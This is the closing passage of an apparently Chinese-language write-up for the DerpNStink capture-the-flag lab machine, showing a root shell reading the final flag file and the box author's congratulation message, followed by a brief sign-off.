root@DeRPnStiNK:~/binaries# cd /root/Desktop
root@DeRPnStiNK:/root/Desktop# ls
flag.txt
root@DeRPnStiNK:/root/Desktop# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo

root@DeRPnStiNK:/root/Desktop#
```

至此，~~已称艺术~~  完结撒靶机